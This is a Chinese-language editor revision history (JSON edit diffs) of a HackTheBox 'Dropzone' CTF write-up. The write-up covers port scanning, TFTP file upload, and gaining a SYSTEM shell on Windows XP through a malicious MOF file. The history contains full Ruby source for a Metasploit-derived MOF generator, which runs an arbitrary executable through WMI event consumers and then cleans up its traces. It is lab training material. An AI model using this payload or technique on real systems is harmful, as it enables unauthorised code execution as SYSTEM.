{"compress":true,"commitItems":[["d6898dbd-1bfa-446e-9716-592b77e108e8",1556869605842,"",[[1556869552163,["whale@Whale",[[1,0,"dropzone\n===\n\n\n第三页\r\n案例\r\nnmap\r\n\r\n用masscan与Nmap工具分别输入以下指令:\r\n\r\nmasscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0 -p1-65535,U:1-65535 > ports?\r\nports=$(cat ports | awk -F \" \" '{print $4}' | awk -F \"/\" '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//')?\r\n\r\nnmap -Pn -sV -sC -sU -sT -p$ports 10.10.10.90?\r\n图一\r\n图二\r\nNmap工具的扫描结果表明UDP 69号端口（TFTP）正在运行，这也证实了这个端口正在使用netcat。\r\n\r\n第四页\r\n对感兴趣文件的渗透\r\n（从上述结果看），获得整个系统的读写权限似乎是可行的。由于llisence.rtf文件只有在早于Windows 7的操作系统下才能隐藏，在查看了eula.txt文件后我们可以得知操作系统是 Windows XP? Service Pack 3.\r\n图三\r\n图四\r\n\r\n第五页\r\n开发\r\n恶意MOF文件的创建\r\n\r\n根据以前有关Stuxnet Windows Printer Spooler vulnerability (MS10-061)的知识，或通过搜索Windows XP 的写入特权攻击，很可能我们的初始载体需要创建一个恶意MOF文件。\r\n在Xst3nZ的博客里，他着重讲述了如何将恶意MOF文件变成武器（来发挥作用），很值得一读，我把他的博客原文链接放在下面：\r\nhttp://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html?\r\n\r\n Metasploit Framework 用恶意MOF文件通过与wbemexec.rb 文件混合来当作某些模块的负载。相关链接：https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilegeattack-on-Windows?\r\n\r\nwbemexec.rb 按以下的方式进行修改并被执行来生成一个恶意MOF文件（附录A）\r\n图五\r\n图六\r\n\r\n第六页\r\n（经由）TFTP传输与壳\r\nTFTP 的 binary（二进制）传输模式是可用的，在MOF文件被上传到 “c:\\windows\\system32\\wbem\\mof ”之前，该MOF文件需要先上传到“c:\\windows\\system32”。\r\n图七\r\n一个壳就马上被SYSTEM接收到。\r\n\r\n第七页\r\nNTFS数据流\r\n在查看了电脑的管理者账户的桌面后，来源于 SysInternals Suite 的 streams.exe 文件被上传，用户及系统标识就可以得到了。\r\n图八\r\n\r\n第八-第十三页\r\n附录A\r\n# -*- coding: binary -*-\r\n\r\n#\r\n# This mixin enables executing arbitrary commands via the\r\n# Windows Management Instrumentation service.\r\n#\r\n# By writing the output of these methods to %SystemRoot%\\system32\\WBEM\\mof,\r\n# your command line will be executed.\r\n#\r\n# This technique was used as part of Stuxnet and further reverse engineered?\r\n# to this form by Ivanlef0u and jduck.\r\n#\r\n\r\n#module Msf\r\n#module Exploit::WbemExec\r\n\r\ndef generate_mof(mofname, exe)\r\n\r\n  classname = rand(0xffff).to_s\r\n\r\n  # From Ivan's decompressed version\r\n  mof = <<-EOT\r\n#pragma namespace(\"\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\cimv2\")\r\nclass MyClass@CLASS@\r\n{?\r\n? [key] string Name;\r\n};\r\nclass ActiveScriptEventConsumer : __EventConsumer\r\n{?\r\n? [key] string Name;\r\n? [not_null] string ScriptingEngine;\r\n? string ScriptFileName;\r\n? [template] string ScriptText;\r\n  uint32 KillTimeout;\r\n};\r\ninstance of __Win32Provider as $P\r\n{\r\n    Name  = \"ActiveScriptEventConsumer\";\t\t\t\r\n    CLSID = \"{266c72e7-62e8-11d1-ad89-00c04fd8fdff}\";\r\n    PerUserInitialization = TRUE;\r\n\r\n};\r\ninstance of __EventConsumerProviderRegistration\r\n{\r\n  Provider = $P;\r\n  ConsumerClassNames = {\"ActiveScriptEventConsumer\"};\r\n};\r\nInstance of ActiveScriptEventConsumer as $cons\r\n{\r\n  Name = \"ASEC\";\r\n  ScriptingEngine = \"JScript\";\r\n  ScriptText = \"\\\\ntry {var s = new ActiveXObject(\\\\\"Wscript.Shell\\\\\");\\\\ns.Run(\\\\\"@EXE@\\\\\");} catch (err) {};\\\\nsv = GetObject(\\\\\"winmgmts:root\\\\\\\\\\\\\\\\cimv2\\\\\");try {sv.Delete(\\\\\"MyClass@CLASS@\\\\\");}  catch (err) {};try {sv.Delete(\\\\\"__EventFilter.Name='instfilt'\\\\\");} catch (err) {};try {sv.Delete(\\\\\"ActiveScriptEventConsumer.Name='ASEC'\\\\\");} catch(err) {};\";\r\n\r\n};\r\nInstance of ActiveScriptEventConsumer as $cons2\r\n\r\n  Name = \"qndASEC\";\r\n  ScriptingEngine = \"JScript\";\r\n  ScriptText = \"\\\\nvar objfs = new ActiveXObject(\\\\\"Scripting.FileSystemObject\\\\\");\\\\ntry {var f1 = objfs.GetFile(\\\\\"wbem\\\\\\\\\\\\\\\\mof\\\\\\\\\\\\\\\\good\\\\\\\\\\\\\\\\#{mofname}\\\\\");\\\\nf1.Delete(true);} catch(err)  {};\\\\ntry {\\\\nvar f2 = objfs.GetFile(\\\\\"@EXE@\\\\\");\\\\nf2.Delete(true);\\\\nvar s =\r\n\r\nGetObject(\\\\\"winmgmts:root\\\\\\\\\\\\\\\\cimv2\\\\\");s.Delete(\\\\\"__EventFilter.Name='qndfilt'\\\\\");s.Delete(\\\\ \"ActiveScriptEventConsumer.Name='qndASEC'\\\\\");\\\\n} catch(err) {};\";\r\n};\r\ninstance of __EventFilter as $Filt\r\n{\r\n  Name = \"instfilt\";\r\n  Query = \"SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class =  \\\\\"MyClass@CLASS@\\\\\"\";\r\n  QueryLanguage = \"WQL\";\r\n};\r\ninstance of __EventFilter as $Filt2\r\n{\r\n  Name = \"qndfilt\";\r\n  Query = \"SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \\\\\"Win32_Process\\\\\" AND TargetInstance.Name = \\\\\"@EXE@\\\\\"\";\r\n  QueryLanguage = \"WQL\";\r\n\r\n};\r\ninstance of __FilterToConsumerBinding as $bind\r\n{\r\n  Consumer = $cons;\r\n  Filter = $Filt;\r\n};\r\n\r\ninstance of __FilterToConsumerBinding as $bind2\r\n{\r\n  Consumer = $cons2;\r\n  Filter = $Filt2;\r\n};\r\ninstance of MyClass@CLASS@ as $MyClass\r\n{\r\n  Name = \"ClassConsumer\";\r\n};\r\nEOT\r\n\r\n  # Replace the input vars\r\n  mof.gsub!(/@CLASS@/, classname)\r\n  mof.gsub!(/@EXE@/, exe)  # NOTE: \\ and \" should be escaped\r\n\r\n  fd = open(\"telemetry.mof\", 'w')\r\n  fd << mof\r\n  fd.close\r\n\r\n  mof\r\nend\r\n\r\n#end\r\n#end\r\n\r\ngenerate_mof('telemetry.mof', 'update.exe')\r\n"]],[0,0],[4472,4472]]],[1556869554764,["whale@Whale",[[-1,0,"dropzone\n===\n\n"],[-1,18,"\r"],[-1,22,"\r"],[-1,28,"\r"],[-1,30,"\r"],[-1,56,"\r"],[-1,58,"\r"],[-1,147,"\r"],[-1,259,"\r"],[-1,261,"\r"],[-1,309,"\r"],[-1,313,"\r"],[-1,317,"\r"],[-1,372,"\r"],[-1,374,"\r"],[-1,379,"\r"],[-1,390,"\r"],[-1,514,"\r"],[-1,518,"\r"],[-1,522,"\r"],[-1,524,"\r"],[-1,529,"\r"],[-1,533,"\r"],[-1,545,"\r"],[-1,547,"\r"],[-1,663,"\r"],[-1,726,"\r"],[-1,809,"\r"],[-1,811,"\r"],[-1,989,"\r"],[-1,991,"\r"],[-1,1036,"\r"],[-1,1040,"\r"],[-1,1044,"\r"],[-1,1046,"\r"],[-1,1051,"\r"],[-1,1065,"\r"],[-1,1173,"\r"],[-1,1177,"\r"],[-1,1196,"\r"],[-1,1198,"\r"],[-1,1203,"\r"],[-1,1212,"\r"],[-1,1288,"\r"],[-1,1292,"\r"],[-1,1294,"\r"],[-1,1303,"\r"],[-1,1308,"\r"],[-1,1334,"\r"],[-1,1336,"\r"],[-1,1339,"\r"],[-1,1398,"\r"],[-1,1445,"\r"],[-1,1448,"\r"],[-1,1525,"\r"],[-1,1564,"\r"],[-1,1567,"\r"],[-1,1645,"\r"],[-1,1685,"\r"],[-1,1688,"\r"],[-1,1690,"\r"],[-1,1703,"\r"],[-1,1730,"\r"],[-1,1732,"\r"],[-1,1764,"\r"],[-1,1766,"\r"],[-1,1799,"\r"],[-1,1801,"\r"],[-1,1839,"\r"],[-1,1855,"\r"],[-1,1904,"\r"],[-1,1926,"\r"],[-1,1930,"\r"],[-1,1952,"\r"],[-1,1956,"\r"],[-1,2007,"\r"],[-1,2011,"\r"],[-1,2033,"\r"],[-1,2071,"\r"],[-1,2097,"\r"],[-1,2130,"\r"],[-1,2153,"\r"],[-1,2157,"\r"],[-1,2192,"\r"],[-1,2195,"\r"],[-1,2240,"\r"],[-1,2295,"\r"],[-1,2330,"\r"],[-1,2332,"\r"],[-1,2336,"\r"],[-1,2385,"\r"],[-1,2388,"\r"],[-1,2406,"\r"],[-1,2461,"\r"],[-1,2465,"\r"],[-1,2513,"\r"],[-1,2516,"\r"],[-1,2534,"\r"],[-1,2566,"\r"],[-1,2932,"\r"],[-1,2934,"\r"],[-1,2938,"\r"],[-1,2987,"\r"],[-1,2989,"\r"],[-1,3010,"\r"],[-1,3042,"\r"],[-1,3323,"\r"],[-1,3325,"\r"],[-1,3495,"\r"],[-1,3499,"\r"],[-1,3535,"\r"],[-1,3538,"\r"],[-1,3560,"\r"],[-1,3665,"\r"],[-1,3691,"\r"],[-1,3695,"\r"],[-1,3732,"\r"],[-1,3735,"\r"],[-1,3756,"\r"],[-1,3900,"\r"],[-1,3926,"\r"],[-1,3928,"\r"],[-1,3932,"\r"],[-1,3980,"\r"],[-1,3983,"\r"],[-1,4004,"\r"],[-1,4023,"\r"],[-1,4027,"\r"],[-1,4029,"\r"],[-1,4078,"\r"],[-1,4081,"\r"],[-1,4103,"\r"],[-1,4123,"\r"],[-1,4127,"\r"],[-1,4167,"\r"],[-1,4170,"\r"],[-1,4197,"\r"],[-1,4201,"\r"],[-1,4206,"\r"],[-1,4208,"\r"],[-1,4236,"\r"],[-1,4271,"\r"],[-1,4333,"\r"],[-1,4335,"\r"],[-1,4370,"\r"],[-1,4383,"\r"],[-1,4395,"\r"],[-1,4397,"\r"],[-1,4404,"\r"],[-1,4409,"\r"],[-1,4411,"\r"],[-1,4417,"\r"],[-1,4423,"\r"],[-1,4425,"\r"],[-1,4470,"\r"]],[0,14],[0,0]]],[1556869555914,["whale@Whale",[[-1,0,"\n"]],[1,1],[0,0]]],[1556869568837,["whale@Whale",[[1,1248,"\n"]],[1247,1247],[1248,1248]]],[1556869571414,["whale@Whale",[[1,1248,"```"]],[1248,1248],[1251,1251]]],[1556869577265,["whale@Whale",[[1,4307,"\n"]],[4306,4306],[4307,4307]]],[1556869579451,["whale@Whale",[[-1,4307,"\n"],[1,4308,"```"]],[4307,4307],[4310,4310]]],[1556870506723,["whale@Whale",[[-1,286,"图一"]],[286,288],[286,286]]],[1556870507215,["whale@Whale",[[1,287,"\n"]],[286,286],[287,287]]],[1556870526135,["whale@Whale",[[1,288,"![123-008]($res/123-008.png)\n\n"]],[287,287],[317,317]]],[1556870527809,["whale@Whale",[[-1,287,"\n"]],[287,287],[286,286]]],[1556870554200,["whale@Whale",[[-1,4,"案例"]],[4,6],[4,4]]],[1556870556404,["whale@Whale",[[1,4,"## s"]],[4,4],[8,8]]],[1556870557169,["whale@Whale",[[-1,7,"s"]],[8,8],[7,7]]],[1556870558899,["whale@Whale",[[1,7,"扫描"]],[7,7],[9,9]]],[1556870561669,["whale@Whale",[[-1,0,"第三页"]],[0,3],[0,0]]],[1556870562538,["whale@Whale",[[-1,0,"\n"]],[1,1],[0,0]]],[1556870568101,["whale@Whale",[[-1,6,"n"]],[7,7],[6,6]]],[1556870570038,["whale@Whale",[[1,6,"N"]],[6,6],[7,7]]],[1556870572026,["whale@Whale",[[-1,6,"Nmap"]],[6,10],[6,6]]],[1556870576964,["whale@Whale",[[-1,7,"\n"]],[7,7],[6,6]]],[1556870577858,["whale@Whale",[[1,7,"\n"]],[6,6],[7,7]]],[1556870579405,["whale@Whale",[[1,7,"```"]],[7,7],[10,10]]],[1556870582416,["whale@Whale",[[1,284,"```"]],[284,284],[287,287]]],[1556870600811,["whale@Whale",[[1,321,"![123-009]($res/123-009.png)\n\n"]],[320,320],[350,350]]],[1556870605362,["whale@Whale",[[-1,318,"图二"]],[318,320],[318,318]]],[1556870606540,["whale@Whale",[[-1,318,"\n"]],[318,318],[317,317]]],[1556870817934,["whale@Whale",[[-1,382,"也证实了这个端口正在"],[1,392,"是"],[1,400,"验证的"]],[381,400],[394,394]]],[1556870873359,["whale@Whale",[[-1,367,"号"]],[368,368],[367,367]]],[1556870875349,["whale@Whale",[[-1,396,"第四页"]],[396,399],[396,396]]],[1556870877680,["whale@Whale",[[1,397,"## "]],[397,397],[400,400]]],[1556870881021,["whale@Whale",[[-1,396,"\n"]],[396,396],[395,395]]],[1556871029321,["whale@Whale",[[-1,514,"? "]],[516,516],[514,514]]],[1556871030676,["whale@Whale",[[1,514," "]],[514,514],[515,515]]],[1556871032767,["whale@Whale",[[-1,529,"."]],[530,530],[529,529]]],[1556871033442,["whale@Whale",[[1,529,"."]],[529,529],[530,530]]],[1556871034047,["whale@Whale",[[-1,529,"."]],[530,530],[529,529]]],[1556871035259,["whale@Whale",[[1,529,"。"]],[529,529],[530,530]]],[1556871046636,["whale@Whale",[[1,534,"![123-012]($res/123-012.png)\n\n"]],[533,533],[563,563]]],[1556871048746,["whale@Whale",[[-1,531,"图三"]],[531,533],[531,531]]],[1556871082141,["whale@Whale",[[1,565,"![123-014]($res/123-014.png)\n\n"]],[564,564],[594,594]]],[1556871084959,["whale@Whale",[[-1,562,"图四"]],[562,564],[562,562]]],[1556871085260,["whale@Whale",[[-1,562,"\n"]],[562,562],[561,561]]],[1556871087795,["whale@Whale",[[-1,593,"第五页"]],[593,596],[593,593]]],[1556871088184,["whale@Whale",[[-1,593,"\n"]],[593,593],[592,592]]],[1556871088564,["whale@Whale",[[-1,592,"\n"]],[592,592],[591,591]]],[1556871103361,["whale@Whale",[[-1,592,"开发"]],[592,594],[592,592]]],[1556871106815,["whale@Whale",[[1,592,"## 利用"]],[592,592],[597,597]]],[1556871112797,["whale@Whale",[[1,595,"漏洞"]],[595,595],[597,597]]],[1556871228732,["whale@Whale",[[1,600,"\n"]],[600,600],[601,601]]],[1556871230424,["whale@Whale",[[1,601,"**"]],[601,601],[603,603]]],[1556871232124,["whale@Whale",[[1,613,"**"]],[613,613],[615,615]]],[1556871256282,["whale@Whale",[[1,732,"\n"]],[731,731],[732,732]]],[1556871270296,["whale@Whale",[[-1,875,"?"]],[876,876],[875,875]]],[1556871287679,["whale@Whale",[[-1,877," "]],[878,878],[877,877]]],[1556871415407,["whale@Whale",[[-1,933,"负载"],[1,935,"payloads"]],[933,935],[941,941]]],[1556871440719,["whale@Whale",[[-1,1057,"?"]],[1058,1058],[1057,1057]]],[1556871479023,["whale@Whale",[[1,1106,"![123-015]($res/123-015.png)\n\n"]],[1105,1105],[1135,1135]]],[1556871488152,["whale@Whale",[[1,1136,"![123-018]($res/123-018.png)\n\n"]],[1135,1135],[1165,1165]]],[1556871490238,["whale@Whale",[[-1,1103,"图五"]],[1103,1105],[1103,1103]]],[1556871491926,["whale@Whale",[[-1,1164,"图六"]],[1164,1166],[1164,1164]]],[1556871492323,["whale@Whale",[[-1,1165,"\n"]],[1164,1164],[1163,1163]]],[1556871499563,["whale@Whale",[[-1,1165,"第六页"]],[1165,1168],[1165,1165]]],[1556871499960,["whale@Whale",[[-1,1165,"\n"]],[1165,1165],[1164,1164]]],[1556871511271,["whale@Whale",[[-1,1165,"（经由）"]],[1165,1169],[1165,1165]]],[1556871512439,["whale@Whale",[[1,1165,"## "]],[1165,1165],[1168,1168]]],[1556871514037,["whale@Whale",[[-1,1175,"壳"]],[1176,1176],[1175,1175]]],[1556871515654,["whale@Whale",[[1,1175,"shell"]],[1175,1175],[1180,1180]]],[1556871518389,["whale@Whale",[[-1,1164,"\n"]],[1164,1164],[1163,1163]]],[1556871570459,["whale@Whale",[[-1,1292,"壳"]],[1292,1293],[1292,1292]]],[1556871572112,["whale@Whale",[[1,1292,"shell"]],[1292,1292],[1297,1297]]],[1556871583302,["whale@Whale",[[1,1290,"![123-020]($res/123-020.png)\n\n"]],[1289,1289],[1319,1319]]],[1556871586311,["whale@Whale",[[-1,1287,"图七"]],[1287,1289],[1287,1287]]],[1556871598897,["whale@Whale",[[1,1341,"\n"]],[1340,1340],[1341,1341]]],[1556871611670,["whale@Whale",[[1,1342,"![123-021]($res/123-021.png)\n\n"]],[1341,1341],[1371,1371]]],[1556871613068,["whale@Whale",[[-1,1341,"\n"]],[1341,1341],[1340,1340]]],[1556871637234,["whale@Whale",[[-1,1134,"![123-018]($res/123-018.png)"]],[1134,1162],[1134,1134]]],[1556871640386,["whale@Whale",[[-1,1260,"![123-020]($res/123-020.png)"]],[1260,1288],[1260,1260]]],[1556871642054,["whale@Whale",[[1,1134,"![123-020]($res/123-020.png)"]],[1134,1134],[1162,1162]]],[1556871646519,["whale@Whale",[[-1,1313,"![123-021]($res/123-021.png)"]],[1313,1341],[1313,1313]]],[1556871648127,["whale@Whale",[[1,1288,"![123-021]($res/123-021.png)"]],[1288,1288],[1316,1316]]],[1556871786296,["whale@Whale",[[-1,532,"![123-012]($res/123-012.png)"]],[532,560],[532,532]]],[1556871786769,["whale@Whale",[[-1,533,"\n"]],[532,532],[531,531]]],[1556871787239,["whale@Whale",[[-1,532,"\n"]],[531,531],[530,530]]],[1556871796085,["whale@Whale",[[-1,1074,"![123-015]($res/123-015.png)"]],[1074,1102],[1074,1074]]],[1556871798067,["whale@Whale",[[1,562,"\n"]],[561,561],[562,562]]],[1556871799599,["whale@Whale",[[1,562,"![123-015]($res/123-015.png)"]],[562,562],[590,590]]],[1556871800781,["whale@Whale",[[1,591,"\n"]],[590,590],[591,591]]],[1556871907110,["whale@Whale",[[-1,1105,"\n"]],[1105,1105],[1104,1104]]],[1556871907330,["whale@Whale",[[-1,1104,"\n"]],[1104,1104],[1103,1103]]],[1556871931804,["whale@Whale",[[-1,1258,"![123-021]($res/123-021.png)"]],[1258,1286],[1258,1258]]],[1556871933401,["whale@Whale",[[1,1133,"![123-021]($res/123-021.png)"]],[1133,1133],[1161,1161]]],[1556871949352,["whale@Whale",[[1,1162,"\n"]],[1162,1162],[1163,1163]]],[1556871971138,["whale@Whale",[[1,1288,"![123-024]($res/123-024.png)\n\n"]],[1287,1287],[1317,1317]]],[1556871972752,["whale@Whale",[[-1,1287,"\n"]],[1287,1287],[1286,1286]]],[1556871976394,["whale@Whale",[[-1,1287,"![123-024]($res/123-024.png)"]],[1287,1315],[1287,1287]]],[1556871982619,["whale@Whale",[[1,1288,"![123-026]($res/123-026.png)\n\n"]],[1287,1287],[1317,1317]]],[1556871984013,["whale@Whale",[[-1,1287,"\n"]],[1287,1287],[1286,1286]]],[1556872001951,["whale@Whale",[[-1,1318,"\n"]],[1318,1318],[1317,1317]]],[1556872002151,["whale@Whale",[[-1,1317,"\n"]],[1317,1317],[1316,1316]]],[1556872010241,["whale@Whale",[[1,1341,"![123-027]($res/123-027.png)\n\n"]],[1340,1340],[1370,1370]]],[1556872016223,["whale@Whale",[[-1,1340,"\n"]],[1340,1340],[1339,1339]]],[1556872019403,["whale@Whale",[[-1,1371,"第七页"]],[1371,1374],[1371,1371]]],[1556872019623,["whale@Whale",[[-1,1371,"\n"]],[1371,1371],[1370,1370]]],[1556872021972,["whale@Whale",[[1,1371,"## "]],[1371,1371],[1374,1374]]],[1556872031288,["whale@Whale",[[-1,1370,"\n"]],[1370,1370],[1369,1369]]],[1556872039594,["whale@Whale",[[-1,1456,"图八"]],[1456,1458],[1456,1456]]],[1556872051960,["whale@Whale",[[1,1457,"![123-032]($res/123-032.png)\n\n"]],[1456,1456],[1486,1486]]],[1556872058070,["whale@Whale",[[-1,1487,"\n"]],[1487,1487],[1486,1486]]],[1556872086584,["whale@Whale",[[-1,1444,"系统标识"]],[1446,1448],[1444,1444]]],[1556872089324,["whale@Whale",[[1,1444,"root flag"]],[1444,1444],[1453,1453]]],[1556872094138,["whale@Whale",[[-1,1441,"用户"],[1,1443,"user"]],[1441,1443],[1445,1445]]],[1556872165281,["whale@Whale",[[-1,1494,"第八-第十三页\n附录A\n```\n# -*- coding: binary -*-\n\n#\n# This mixin enables executing arbitrary commands via the\n# Windows Management Instrumentation service.\n#\n# By writing the output of these methods to %SystemRoot%\\system32\\WBEM\\mof,\n# your command line will be executed.\n#\n# This technique was used as part of Stuxnet and further reverse engineered?\n# to this form by Ivanlef0u and jduck.\n#\n\n#module Msf\n#module Exploit::WbemExec\n\ndef generate_mof(mofname, exe)\n\n  classname = rand(0xffff).to_s\n\n  # From Ivan's decompressed version\n  mof = <<-EOT\n#pragma namespace(\"\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\cimv2\")\nclass MyClass@CLASS@\n{?\n? [key] string Name;\n};\nclass ActiveScriptEventConsumer : __EventConsumer\n{?\n? [key] string Name;\n? [not_null] string ScriptingEngine;\n? string ScriptFileName;\n? [template] string ScriptText;\n  uint32 KillTimeout;\n};\ninstance of __Win32Provider as $P\n{\n    Name  = \"ActiveScriptEventConsumer\";\t\t\t\n    CLSID = \"{266c72e7-62e8-11d1-ad89-00c04fd8fdff}\";\n    PerUserInitialization = TRUE;\n\n};\ninstance of __EventConsumerProviderRegistration\n{\n  Provider = $P;\n  ConsumerClassNames = {\"ActiveScriptEventConsumer\"};\n};\nInstance of ActiveScriptEventConsumer as $cons\n{\n  Name = \"ASEC\";\n  ScriptingEngine = \"JScript\";\n  ScriptText = \"\\\\ntry {var s = new ActiveXObject(\\\\\"Wscript.Shell\\\\\");\\\\ns.Run(\\\\\"@EXE@\\\\\");} catch (err) {};\\\\nsv = GetObject(\\\\\"winmgmts:root\\\\\\\\\\\\\\\\cimv2\\\\\");try {sv.Delete(\\\\\"MyClass@CLASS@\\\\\");}  catch (err) {};try {sv.Delete(\\\\\"__EventFilter.Name='instfilt'\\\\\");} catch (err) {};try {sv.Delete(\\\\\"ActiveScriptEventConsumer.Name='ASEC'\\\\\");} catch(err) {};\";\n\n};\nInstance of ActiveScriptEventConsumer as $cons2\n\n  Name = \"qndASEC\";\n  ScriptingEngine = \"JScript\";\n  ScriptText = \"\\\\nvar objfs = new ActiveXObject(\\\\\"Scripting.FileSystemObject\\\\\");\\\\ntry {var f1 = objfs.GetFile(\\\\\"wbem\\\\\\\\\\\\\\\\mof\\\\\\\\\\\\\\\\good\\\\\\\\\\\\\\\\#{mofname}\\\\\");\\\\nf1.Delete(true);} catch(err)  {};\\\\ntry {\\\\nvar f2 = objfs.GetFile(\\\\\"@EXE@\\\\\");\\\\nf2.Delete(true);\\\\nvar s =\n\nGetObject(\\\\\"winmgmts:root\\\\\\\\\\\\\\\\cimv2\\\\\");s.Delete(\\\\\"__EventFilter.Name='qndfilt'\\\\\");s.Delete(\\\\ \"ActiveScriptEventConsumer.Name='qndASEC'\\\\\");\\\\n} catch(err) {};\";\n};\ninstance of __EventFilter as $Filt\n{\n  Name = \"instfilt\";\n  Query = \"SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class =  \\\\\"MyClass@CLASS@\\\\\"\";\n  QueryLanguage = \"WQL\";\n};\ninstance of __EventFilter as $Filt2\n{\n  Name = \"qndfilt\";\n  Query = \"SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \\\\\"Win32_Process\\\\\" AND TargetInstance.Name = \\\\\"@EXE@\\\\\"\";\n  QueryLanguage = \"WQL\";\n\n};\ninstance of __FilterToConsumerBinding as $bind\n{\n  Consumer = $cons;\n  Filter = $Filt;\n};\n\ninstance of __FilterToConsumerBinding as $bind2\n{\n  Consumer = $cons2;\n  Filter = $Filt2;\n};\ninstance of MyClass@CLASS@ as $MyClass\n{\n  Name = \"ClassConsumer\";\n};\nEOT\n\n  # Replace the input vars\n  mof.gsub!(/@CLASS@/, classname)\n  mof.gsub!(/@EXE@/, exe)  # NOTE: \\ and \" should be escaped\n\n  fd = open(\"telemetry.mof\", 'w')\n  fd << mof\n  fd.close\n\n  mof\nend\n\n#end\n#end\n\ngenerate_mof('telemetry.mof', 'update.exe')\n```"]],[1494,4568],[1494,1494]]],[1556872527815,["whale@Whale",[[1,1102,",[https://github.com/Whale3070/ctf-coding/blob/master/Dropzone-mof](https://github.com/Whale3070/ctf-coding/blob/master/Dropzone-mof)"]],[1102,1102],[1235,1235]]],[1556872535262,["whale@Whale",[[-1,1137,"coding/blob/master"]],[1137,1155],[1137,1137]]],[1556872538899,["whale@Whale",[[-1,1104,"https://github.com/Whale3070/ctf-/"]],[1104,1138],[1104,1104]]],[1556872546355,["whale@Whale",[[-1,1097,"（附录A）,"]],[1097,1102],[1097,1097]]],[1556872547250,["whale@Whale",[[1,1097,","]],[1097,1097],[1098,1098]]],[1556872547819,["whale@Whale",[[-1,1097,","]],[1098,1098],[1097,1097]]],[1556872548532,["whale@Whale",[[1,1097,"，"]],[1097,1097],[1098,1098]]],[1556872556243,["whale@Whale",[[1,1099,"文件下载地址为"]],[1099,1099],[1106,1106]]],[1556872563211,["whale@Whale",[[-1,1099,"文件下载地址为"]],[1099,1106],[1099,1099]]],[1556872565428,["whale@Whale",[[1,1111,"文件下载地址为"]],[1111,1111],[1118,1118]]],[1556872657978,["whale@Whale",[[1,0,"\n"]],[0,0],[1,1]]],[1556872658382,["whale@Whale",[[1,0,"\n"]],[1,1],[2,2]]],[1556872662531,["whale@Whale",[[1,0,"## 前沿"]],[0,0],[5,5]]],[1556872662987,["whale@Whale",[[-1,4,"沿"]],[5,5],[4,4]]],[1556872664089,["whale@Whale",[[1,4,"言"]],[4,4],[5,5]]],[1556872664472,["whale@Whale",[[1,7,"\n"]],[5,5],[6,6]]],[1556872684181,["whale@Whale",[[1,6,"hackthebox是一个在线的渗透平台，通过渗透获取邀请码，即可在这个平台上注册一个账号。\n\n该平台的在线靶机一共20台，每周会下线一台靶机，如果靶机下线了呢，分数就会全部清空。而成功渗透靶机就能获取一定的分数，分数够了就能提升等级。\n\n在线的靶机都是没有writeup的，所以你的等级很大程度可以证明你的渗透实战能力。\n\n该平台一共7个用户等级，刚注册是等级Noob：\n\n1. Noob 无知者\n2. script kiddle 脚本小子 \n3. hacker 黑客\n4. Pro hacker 专业黑客\n5. Elite Hacker 精英黑客\n6. Guru 大师\n7. Omniscient （最高等级）无所不知者\n\n靶机的分数为20-50分\n1. 20分-easy 简单\n2. 30分-medium 中等难度\n3. 40分-hard 困难的\n3. 50分-Insane 疯狂的\n\n下面介绍关于过期的机器**Brainfuck**的渗透过程，难度等级为hard。\n"]],[6,6],[443,443]]],[1556872743697,["whale@Whale",[[-1,415,"Brainfuck"],[1,424,"Dropzone"]],[415,424],[423,423]]],[1556872757856,["whale@Whale",[[-1,436,"hard"]],[440,440],[436,436]]],[1556872760385,["whale@Whale",[[1,436,"medium"]],[436,436],[442,442]]],[1556872762914,["whale@Whale",[[-1,445,"\n"]],[445,445],[444,444]]]]]]}